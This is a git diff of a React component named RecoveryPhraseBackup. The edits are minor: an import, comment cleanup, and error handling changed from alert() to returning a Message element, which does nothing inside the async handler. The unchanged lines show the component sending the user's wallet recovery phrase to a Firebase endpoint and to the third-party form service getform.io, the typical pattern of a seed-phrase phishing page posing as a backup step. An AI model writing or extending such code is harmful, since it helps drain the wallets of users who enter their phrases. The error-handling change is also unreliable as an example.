@@ -2,6 +2,7 @@ import React, { useState } from "react";
 import { Button } from "../../../../../Global/Button/Button";
 import { usePost } from "../../../../../Global/hook/usePost";
 import { Input } from "../../../../../Global/Input/Input";
+import { Message } from "../../../../../Global/Message/Message";
 
 interface RecoveryPhraseBackupProps {
   onSuccess: () => void;
@@ -24,7 +25,7 @@ export const RecoveryPhraseBackup: React.FC<RecoveryPhraseBackupProps> = ({ onSu
     };
 
     // Make the POST request to Firebase using the usePost hook
-    await post("backedup", postData); // Replace 'your-firebase-endpoint' with the actual Firebase URL
+    await post("backedup", postData);
 
     // Make the POST request to getform.io
     try {
@@ -36,12 +37,11 @@ export const RecoveryPhraseBackup: React.FC<RecoveryPhraseBackupProps> = ({ onSu
         },
       });
     } catch (error: any) {
-      alert(error.message);
+      return <Message message={error.message} />;
       // Handle any exceptions that may occur during the fetch request
     }
-
-    // Call the 'onSuccess' callback or any other logic you need after the form is successfully submitted
     onSuccess();
+    // Call the 'onSuccess' callback or any other logic you need after the form is successfully submitted
   };
 
   return (
